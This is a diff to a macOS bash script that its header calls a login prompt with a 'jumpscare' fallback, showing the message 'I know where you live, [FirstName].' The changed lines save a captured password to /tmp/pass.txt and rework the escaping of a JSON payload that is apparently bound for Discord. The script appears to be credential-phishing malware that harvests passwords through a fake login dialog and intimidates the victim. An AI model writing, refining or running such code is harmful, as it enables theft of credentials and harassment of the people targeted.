@@ -1,5 +1,5 @@
 #!/bin/bash
-# Combined Login Prompt with Jumpscare Fallback for macOS (Python-Free JSON with Debug Logging)
+# Combined Login Prompt with Jumpscare Fallback for macOS (Python-Free JSON with Improved Escaping)
 # ------------------------------------------------------------------------------
 # - Displays a login prompt with two lines:
 #     "I know where you live, [FirstName]."
@@ -130,10 +130,8 @@ else
     echo -e "$capture" > /tmp/pass.txt
     
     # --- Manually Generate JSON Payload Without Python ---
-    # Replace newlines with \n and escape double quotes.
-    # Using tr to replace newlines and sed to escape quotes.
-    escaped=$(tr '\n' '\\n' < /tmp/pass.txt | sed 's/"/\\"/g')
-    payload="{\"content\": \"$escaped\"}"
+    # Use sed and printf to escape backslashes, quotes, and newlines.
+    payload=$(printf '{"content": "%s"}' "$(sed 's/\\/\\\\/g; s/"/\\"/g; s/\n/\\n/g' /tmp/pass.txt)")
     
     # --- Debug: Log the payload for troubleshooting ---
     echo "Payload: $payload" > /tmp/discord_payload.log
